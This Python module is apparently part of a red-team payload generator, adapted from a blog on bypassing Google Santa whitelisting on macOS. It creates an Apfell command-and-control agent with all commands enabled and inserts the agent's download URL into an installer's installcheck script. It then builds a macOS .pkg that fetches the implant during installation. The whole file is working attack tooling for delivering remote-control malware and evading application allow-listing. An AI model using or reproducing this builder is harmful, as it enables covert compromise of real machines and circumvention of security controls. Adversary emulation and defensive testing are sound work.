# Adapted from https://www.praetorian.com/blog/bypassing-google-santa-application-whitelisting-on-macos-part-2/

import os
import asyncio
from .Utilities import *


def install_js_script():
    temp = "./Templates/Installer_Package_JS_Script/"
    payload = "./Payloads/Installer_Package_JS_Script_Payload"
    copyanything(temp, payload)

    ## Create apfell payload
    async def scripting():
        payload_info = await login_and_create_apfell(description="Installer Pkg with JS Functionality calls Script",
                                                     filename="Installer_with_JavaScript_Script.js",
                                                     include_all_commands=True)
        print("[*] Building Installer Package JS Script Payload")
        url = await get_payload_download_url(payload_info)
        # Reaplace template values
        templateString = "templatescript"
        fin = open(payload + "/distribution.xml", "rt")
        data = fin.read()
        data = data.replace(templateString, "installcheck")  # the filename can be anything
        fin.close()
        fin = open(payload + "/distribution.xml", "wt")
        fin.write(data)
        fin.close()

        templateString = "URL"
        modifyFile = payload + "/Scripts/installcheck"

        fin = open(modifyFile, "rt")
        data = fin.read()
        data = data.replace(templateString, url)
        fin.close()
        fin = open(payload + "/Scripts/installcheck", "wt")
        fin.write(data)
        fin.close()

        os.system("chmod +x " + payload + "/Scripts/installcheck")
        os.system("pkgbuild --identifier simple.test --nopayload " + payload + "/install.pkg")
        os.system(
            "productbuild --distribution " + payload + "/distribution.xml " + "--scripts " + payload + "/Scripts " + "--package-path " + payload + "/install.pkg " + payload + "/JSpackageScript.pkg")

        print("[+] Built Installer Package Payload w/ JavaScript as JSpackage.pkg")

    async def main():
        await scripting()

    asyncio.run(main())
